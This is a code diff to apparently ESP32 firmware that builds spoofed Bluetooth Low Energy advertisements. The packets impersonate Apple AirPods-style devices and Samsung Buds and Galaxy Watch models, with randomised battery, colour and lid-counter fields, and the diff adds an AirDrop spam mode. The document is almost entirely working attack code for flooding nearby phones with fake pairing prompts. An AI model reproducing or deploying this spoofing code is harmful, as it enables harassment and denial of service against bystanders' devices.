@@ -16,7 +16,9 @@ NimBLEScan *pBLEScan;
 LinkedList<BLEScanResult>* blescanres;
 bool bleScanRedraw = false;
 bool bleAnalyzerMode = false;
+bool samsungbuds = false;
 uint8_t spooferDeviceIndex = -1;
+uint8_t spooferAppleDeviceColor = -1;
 uint8_t spooferConnectableModeIndex = -1;
 uint8_t spooferDiscoverableModeIndex = -1;
 
@@ -374,18 +376,102 @@ BLEAdvertisementData BLEModules::selectSpooferDevices(uint8_t device_type, uint8
     BLEAdvertisementData AdvData = BLEAdvertisementData();
     if (device_brand == BLE_SPOOFER_DEVICE_BRAND_APPLE) {
         Serial.println("[INFO] BLE Apple Spoofer Starting");
-        uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[(int)device_type],
-                              0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
-                              0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
-                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-       AdvData.addData(packet, 31);
+                uint8_t AdvData_Raw[31];
+                int i = 0;
+                AdvData_Raw[i++] = 31 - 1; // Size
+                AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
+                AdvData_Raw[i++] = 0x4C; // Company ID (Apple, Inc.)
+                AdvData_Raw[i++] = 0x00; // ...
+                AdvData_Raw[i++] = 0x07; // Continuity Type
+                AdvData_Raw[i++] = 0x19; // Continuity Size
+                //uint8_t model_index = random(GET_SIZE(pp_models));
+                uint16_t model = pp_models[(int)device_type].value;
+                uint8_t color;
+                if (espatsettings.useAppleJuicePaired)
+                    color = pp_models[(int)device_type].colors[spooferAppleDeviceColor].value;
+                else color = pp_models[(int)device_type].colors[random(pp_models[(int)device_type].colors_count)].value;
+                uint8_t prefix;
+                if(model == 0x0055 || model == 0x0030) prefix = 0x05;
+                else {
+                    if (espatsettings.useAppleJuicePaired) {
+                        prefix = 0x01;
+                        Serial.println("[INFO] Enable Colored Apple Device Spoofer");
+                    }
+                    else prefix = 0x07;
+                }
+                AdvData_Raw[i++] = prefix; // Prefix (paired 0x01 new 0x07 airtag 0x05)
+                AdvData_Raw[i++] = (model >> 0x08) & 0xFF; // Device Model
+                AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // ...
+                AdvData_Raw[i++] = 0x55; // Status
+                AdvData_Raw[i++] = (random(10) << 4) + random(10); // Buds Battery Level
+                AdvData_Raw[i++] = (random(8) << 4) + random(10); // Charing Status and Battery Case Level
+                AdvData_Raw[i++] = random(256); // Lid Open Counter
+                AdvData_Raw[i++] = color; // Device Color
+                AdvData_Raw[i++] = 0x00;
+                esp_fill_random(&AdvData_Raw[i], 16);
+                i += 16;
+                AdvData.addData(AdvData_Raw, 31);
     } else if (device_brand == BLE_SPOOFER_DEVICE_BRAND_SAMSUNG) {
         Serial.println("[INFO] BLE Samsung Spoofer Starting");
-        uint8_t model = watch_models[(int)device_type].value;
-        uint8_t AdvData_Raw[15] = {0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 
-                                   0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43,
-                                   (uint8_t)((model >> 0x00) & 0xFF)};
-        AdvData.addData(AdvData_Raw, 15);
+        if (samsungbuds) {
+            uint32_t model = buds_models[(int)device_type].value;
+            int i = 0;
+            uint8_t AdvData_Raw[31];
+            AdvData_Raw[i++] = 27; // Size
+            AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
+            AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
+            AdvData_Raw[i++] = 0x00; // ...
+            AdvData_Raw[i++] = 0x42;
+            AdvData_Raw[i++] = 0x09;
+            AdvData_Raw[i++] = 0x81;
+            AdvData_Raw[i++] = 0x02;
+            AdvData_Raw[i++] = 0x14;
+            AdvData_Raw[i++] = 0x15;
+            AdvData_Raw[i++] = 0x03;
+            AdvData_Raw[i++] = 0x21;
+            AdvData_Raw[i++] = 0x01;
+            AdvData_Raw[i++] = 0x09;
+            AdvData_Raw[i++] = (model >> 0x10) & 0xFF; // Buds Model / Color (?)
+            AdvData_Raw[i++] = (model >> 0x08) & 0xFF; // ...
+            AdvData_Raw[i++] = 0x01; // ... (Always static?)
+            AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // ...
+            AdvData_Raw[i++] = 0x06;
+            AdvData_Raw[i++] = 0x3C;
+            AdvData_Raw[i++] = 0x94;
+            AdvData_Raw[i++] = 0x8E;
+            AdvData_Raw[i++] = 0x00;
+            AdvData_Raw[i++] = 0x00;
+            AdvData_Raw[i++] = 0x00;
+            AdvData_Raw[i++] = 0x00;
+            AdvData_Raw[i++] = 0xC7;
+            AdvData_Raw[i++] = 0x00;
+
+            AdvData_Raw[i++] = 16; // Size
+            AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
+            AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
+            AdvData.addData(AdvData_Raw, 31);
+            Serial.println("[INFO] Enable Samsung Buds Spoofer");
+        } else {
+            uint32_t model = watch_models[(int)device_type].value;
+            int i = 0;
+            uint8_t AdvData_Raw[15];
+            AdvData_Raw[i++] = 15 - 1; // Size
+            AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
+            AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
+            AdvData_Raw[i++] = 0x00; // ...
+            AdvData_Raw[i++] = 0x01;
+            AdvData_Raw[i++] = 0x00;
+            AdvData_Raw[i++] = 0x02;
+            AdvData_Raw[i++] = 0x00;
+            AdvData_Raw[i++] = 0x01;
+            AdvData_Raw[i++] = 0x01;
+            AdvData_Raw[i++] = 0xFF;
+            AdvData_Raw[i++] = 0x00;
+            AdvData_Raw[i++] = 0x00;
+            AdvData_Raw[i++] = 0x43;
+            AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)
+            AdvData.addData(AdvData_Raw, 15);
+        }
     }
 
     Serial.println("[INFO] BLE Spoofer Device Index: " + (String)device_type);
@@ -512,7 +598,7 @@ void BLEModules::executeSwiftpair(EBLEPayloadType type, bool forspamall)
     pAdvertising->start();
     if (!forspamall) {
         if (type == AppleJuice) vTaskDelay(espatsettings.applejuiceSpamDelay / portTICK_PERIOD_MS);
-        else if (type == SourApple) vTaskDelay(espatsettings.sourappleSpamDelay / portTICK_PERIOD_MS);
+        else if (type == SourApple || type == AppleAirDrop) vTaskDelay(espatsettings.sourappleSpamDelay / portTICK_PERIOD_MS);
         else vTaskDelay(espatsettings.swiftpairSpamDelay / portTICK_PERIOD_MS);
     } else {
         vTaskDelay(espatsettings.spamAllDelay / portTICK_PERIOD_MS);
